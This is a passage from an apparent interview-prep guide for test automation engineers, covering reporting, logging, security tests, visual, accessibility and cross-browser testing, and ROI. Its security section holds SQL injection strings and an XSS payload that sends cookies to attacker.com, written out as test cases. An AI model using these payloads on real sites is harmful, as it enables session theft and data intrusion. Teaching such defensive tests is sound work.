        subprocess.run(cmd, shell=True)
```

---

# 11. TEST REPORTING & METRICS

## 11.1 Allure Reporting

```java
// Add Allure annotations
@Feature("User Management")
@Story("User Login")
public class LoginTest {
    
    @Description("Test successful login with valid credentials")
    @Severity(SeverityLevel.BLOCKER)
    @Link(name = "JIRA-123", url = "https://jira.example.com/browse/JIRA-123")
    @Test
    public void testSuccessfulLogin() {
        Allure.parameter("email", "user@test.com");
        Allure.parameter("browser", "Chrome");
        
        LoginPage page = new LoginPage(driver);
        page.login("user@test.com", "password");
        
        Allure.step("Verify user is logged in", () -> {
            assert page.isLoggedIn();
        });
    }
    
    @Step("Login with email {email} and password {password}")
    public void loginAs(String email, String password) {
        // Implementation
    }
}

// Configuration
<dependency>
    <groupId>io.qameta.allure</groupId>
    <artifactId>allure-junit4</artifactId>
    <version>2.13.8</version>
</dependency>
```

**Generate Report:**
```bash
mvn allure:serve
```

---

## 11.2 Custom Test Reporting

```java
public class TestReport {
    private List<TestResult> results = new ArrayList<>();
    
    public void generate(String outputPath) {
        StringBuilder html = new StringBuilder();
        html.append("<html><head><title>Test Report</title></head><body>");
        html.append("<h1>Test Execution Report</h1>");
        html.append("<table border='1'>");
        html.append("<tr><th>Test Name</th><th>Status</th><th>Duration</th></tr>");
        
        int passed = 0, failed = 0;
        
        for (TestResult result : results) {
            String statusColor = result.isPassed() ? "green" : "red";
            html.append(String.format(
                "<tr><td>%s</td><td style='background-color:%s'>%s</td><td>%dms</td></tr>",
                result.getName(),
                statusColor,
                result.isPassed() ? "PASSED" : "FAILED",
                result.getDuration()
            ));
            
            if (result.isPassed()) passed++;
            else failed++;
        }
        
        html.append("</table>");
        html.append(String.format("<h2>Total: %d, Passed: %d, Failed: %d</h2>", 
            results.size(), passed, failed));
        html.append("</body></html>");
        
        try (FileWriter writer = new FileWriter(outputPath)) {
            writer.write(html.toString());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

---

## 11.3 Key Metrics to Track

| Metric | Formula | Good Value |
|--------|---------|-----------|
| Pass Rate | (Passed / Total) × 100 | > 95% |
| Execution Time | Total duration | < 30 min for E2E |
| Flakiness Rate | (Flaky / Total) × 100 | < 5% |
| Coverage | (Lines tested / Total lines) × 100 | > 80% |
| Defect Escape Rate | (Defects found post-release / Total defects) × 100 | < 5% |
| Test Maintenance | Hours spent / Tests created | < 0.2 |

---

# 12. LOGGING & DEBUGGING

## 12.1 Logging Framework (Log4j)

```properties
# log4j.properties
log4j.rootLogger=INFO, console, file

log4j.appender.console=org.apache.log4j.ConsoleAppender
log4j.appender.console.layout=org.apache.log4j.PatternLayout
log4j.appender.console.layout.ConversionPattern=%d{yyyy-MM-dd HH:mm:ss} [%t] %-5p %c{1} - %m%n

log4j.appender.file=org.apache.log4j.RollingFileAppender
log4j.appender.file.File=logs/test.log
log4j.appender.file.MaxFileSize=10MB
log4j.appender.file.layout=org.apache.log4j.PatternLayout
log4j.appender.file.layout.ConversionPattern=%d{yyyy-MM-dd HH:mm:ss} [%t] %-5p %c{1} - %m%n
```

**Usage:**
```java
import org.apache.log4j.Logger;

public class LoginTest {
    private static final Logger logger = Logger.getLogger(LoginTest.class);
    
    @Test
    public void testLogin() {
        logger.info("Starting login test");
        logger.debug("Browser: Chrome");
        
        try {
            LoginPage page = new LoginPage(driver);
            page.login("user@test.com", "password");
            logger.info("Login successful");
        } catch (Exception e) {
            logger.error("Login failed", e);
            throw e;
        }
    }
}
```

---

## 12.2 Debugging Techniques

### Browser DevTools

```javascript
// In browser console
// Get element
document.querySelector('#button')

// Check element properties
var el = document.querySelector('#username');
console.log(el.value);

// Interact with page
document.querySelector('button').click();

// Get all attributes
var element = document.querySelector('#input');
for (var i = 0; i < element.attributes.length; i++) {
    console.log(element.attributes[i].name + ": " + element.attributes[i].value);
}
```

### Network Debugging

```java
// Capture network requests
List<LogEntry> logs = driver.manage().logs().get("browser").getAll();

for (LogEntry entry : logs) {
    System.out.println(entry.getLevel() + ": " + entry.getMessage());
}

// Check response times
WebDriver driver = new ChromeDriver();
long startTime = System.currentTimeMillis();
driver.get("https://example.com");
long endTime = System.currentTimeMillis();

System.out.println("Page load time: " + (endTime - startTime) + "ms");
```

---

# 13. SECURITY TESTING

## 13.1 OWASP Top 10

### 1. Injection (SQL Injection)
```sql
-- Vulnerable query
SELECT * FROM users WHERE email = ' OR '1'='1';

-- Test case
email = " OR 1=1 --
```

**Test:**
```java
@Test
public void testSQLInjectionInLogin() {
    String maliciousInput = "' OR '1'='1";
    
    given()
        .formParam("email", maliciousInput)
        .formParam("password", maliciousInput)
        .when()
        .post("/login")
        .then()
        .statusCode(401);  // Should reject, not return all users
}
```

### 2. Cross-Site Scripting (XSS)
```html
<!-- Vulnerable input -->
<input value="<script>alert('XSS')</script>">

<!-- Test case -->
Username: <script>document.location='http://attacker.com?cookie='+document.cookie</script>
```

**Test:**
```java
@Test
public void testXSSInUserProfile() {
    String xssPayload = "<script>alert('XSS')</script>";
    
    given()
        .formParam("bio", xssPayload)
        .when()
        .post("/profile")
        .then()
        .statusCode(200);
    
    // Verify script is not executed (escaped)
    String profile = driver.get("/profile");
    assertThat(profile).contains("&lt;script&gt;");  // Escaped
    assertThat(profile).doesNotContain("<script>");  // Not raw script
}
```

### 3. Authentication Bypass
```java
@Test
public void testAuthenticationBypass() {
    // Try to access protected resource without token
    given()
        .when()
        .get("/admin/users")
        .then()
        .statusCode(401);  // Unauthorized, not 200
    
    // Try with expired token
    given()
        .header("Authorization", "Bearer expired_token")
        .when()
        .get("/admin/users")
        .then()
        .statusCode(401);
}
```

### 4. Sensitive Data Exposure
```java
@Test
public void testSensitiveDataNotExposed() {
    Response response = given()
        .when()
        .get("/api/users/1")
        .then()
        .extract()
        .response();
    
    // Password should not be in response
    assertThat(response.asString()).doesNotContain("password");
    
    // SSN should be masked
    String ssn = response.path("ssn");
    assertThat(ssn).matches("\\*{5}\\d{4}");  // Format: *****1234
}
```

---

## 13.2 API Security Testing

```java
public class APISecurityTest {
    
    @Test
    public void testSSLValidation() {
        // Ensure API uses HTTPS
        given()
            .when()
            .get("http://api.example.com/users")  // HTTP, not HTTPS
            .then()
            .statusCode(301);  // Should redirect to HTTPS
    }
    
    @Test
    public void testCORSVulnerability() {
        Response response = given()
            .header("Origin", "http://malicious.com")
            .when()
            .get("/api/users")
            .then()
            .extract()
            .response();
        
        // Should not allow any origin
        String allowOrigin = response.header("Access-Control-Allow-Origin");
        assertThat(allowOrigin).isNotEqualTo("*");
    }
    
    @Test
    public void testRateLimiting() {
        // Make 100 requests rapidly
        for (int i = 0; i < 100; i++) {
            given()
                .when()
                .get("/api/users")
                .then()
                .statusCode(200);
        }
        
        // Next request should be rate limited
        given()
            .when()
            .get("/api/users")
            .then()
            .statusCode(429);  // Too Many Requests
    }
}
```

---

# 14. ADVANCED TEST CONCEPTS

## 14.1 Visual Regression Testing

```java
// Using Percy
@Test
public void testVisualRegression() {
    driver.get("https://example.com");
    
    // Take snapshot for comparison
    Percy.snapshot(driver, "homepage");
    
    // Click button
    driver.findElement(By.id("button")).click();
    
    // Take another snapshot
    Percy.snapshot(driver, "button-clicked");
    
    // Percy compares and detects visual changes
}

// Using Applitools
@Test
public void testWithApplitools() {
    Eyes eyes = new Eyes();
    eyes.open(driver, "My App", "Login Page");
    
    driver.get("https://example.com");
    eyes.checkWindow("Main");
    
    driver.findElement(By.id("login")).click();
    eyes.checkWindow("After Login");
    
    eyes.close();
}
```

---

## 14.2 Accessibility Testing (WCAG)

```java
// Using Axe-core
@Test
public void testAccessibility() throws IOException {
    driver.get("https://example.com");
    
    // Inject Axe script
    String axeJS = new String(Files.readAllBytes(Paths.get("axe.min.js")));
    JavascriptExecutor js = (JavascriptExecutor) driver;
    js.executeScript(axeJS);
    
    // Run accessibility scan
    String results = (String) js.executeScript(
        "return JSON.stringify(axe.run())"
    );
    
    // Parse and assert no violations
    JSONObject json = new JSONObject(results);
    JSONArray violations = json.getJSONArray("violations");
    
    assertThat(violations.length()).isEqualTo(0);
}

// Using WAVE
@Test
public void testWaveCompliance() {
    driver.get("https://example.com");
    
    // Execute WAVE script
    JavascriptExecutor js = (JavascriptExecutor) driver;
    Object result = js.executeScript("return WAVE.run()");
    
    // Check for errors
    assertThat(result).as("No accessibility errors").isNull();
}
```

---

## 14.3 Cross-Browser Testing

```java
@RunWith(Parameterized.class)
public class CrossBrowserTest {
    
    private String browserName;
    private WebDriver driver;
    
    @Parameterized.Parameters
    public static Collection<String> data() {
        return Arrays.asList("chrome", "firefox", "safari", "edge");
    }
    
    public CrossBrowserTest(String browserName) {
        this.browserName = browserName;
    }
    
    @Before
    public void setup() {
        driver = getBrowser(browserName);
    }
    
    @Test
    public void testLoginOnMultipleBrowsers() {
        LoginPage page = new LoginPage(driver);
        page.login("user@test.com", "password");
        
        assertThat(page.isLoggedIn()).isTrue();
    }
    
    private WebDriver getBrowser(String browser) {
        switch(browser) {
            case "chrome":
                return new ChromeDriver();
            case "firefox":
                return new FirefoxDriver();
            case "safari":
                return new SafariDriver();
            case "edge":
                return new EdgeDriver();
            default:
                return new ChromeDriver();
        }
    }
    
    @After
    public void teardown() {
        driver.quit();
    }
}
```

---

# 15. SOFT SKILLS & LEADERSHIP

## 15.1 Test Automation ROI

**Calculation:**
```
ROI = (Cost Savings - Cost of Automation) / Cost of Automation × 100

Example:
- Manual test execution: 10 tests × 30 minutes = 300 minutes/week
- Cost: 300 minutes × $1/minute = $300/week
- Annual cost: $300 × 52 weeks = $15,600

- Automation cost: $20,000 (first year development)
- Annual cost after: $2,000 (maintenance)

- ROI = ($15,600 - $20,000) / $20,000 × 100 = -20% (first year)
- ROI = ($15,600 - $2,000) / $2,000 × 100 = 680% (second year)
```

**Break-even Point:**
```
Cost of Automation = Annual Savings
$20,000 = $15,600 × months/12
Months = 15.4

Break-even: ~15 months
```

---

## 15.2 Stakeholder Communication

**Executive Summary:**
```
Test Automation Status Report - Q4 2024

Metrics:
✓ Tests Automated: 450
✓ Test Coverage: 78%
✓ Average Build Time: 45 minutes (down from 2 hours)
✓ Defects Detected Early: 156 (cost savings: $125,000)

Benefits:
- Reduced time-to-market by 50%
- 90% fewer production bugs
- Team capacity increased by 40%

Investment:
- Tools: $30,000/year
- Team: 2 SDETs (salary)

ROI: 350% this year
```

---

## 15.3 Mentoring QA Team

**Teaching Program:**
1. **Month 1:** Selenium basics, Page Object Model
2. **Month 2:** API testing, test data management
3. **Month 3:** CI/CD integration, Docker
4. **Month 4:** Advanced patterns, framework design

**Code Review Checklist:**
- [ ] Follows Page Object Model
- [ ] No hardcoded waits
- [ ] Proper error handling
- [ ] Reusable code
- [ ] Clear test names
- [ ] Comments on complex logic

---

## 15.4 Risk Assessment in Testing

```
Risk Matrix:

┌────────────┬─────────┬──────────┬─────────┐
│ Feature    │ Impact  │ Prob     │ Risk    │
├────────────┼─────────┼──────────┼─────────┤
│ Payment    │ Critical│ Medium   │ HIGH    │
│ Login      │ Critical│ Low      │ MEDIUM  │
│ Reports    │ Low     │ High     │ MEDIUM  │
│ UI Polish  │ Low     │ Low      │ LOW     │
└────────────┴─────────┴──────────┴─────────┘

Testing Strategy by Risk:
- HIGH: Full E2E + Manual testing + Security testing
- MEDIUM: E2E + API tests
- LOW: Smoke tests + random manual checks
```

---

**END OF GUIDE**

This document covers comprehensive interview preparation for 10+ years SDET Architects. Each section includes practical examples, best practices, and real-world scenarios.

---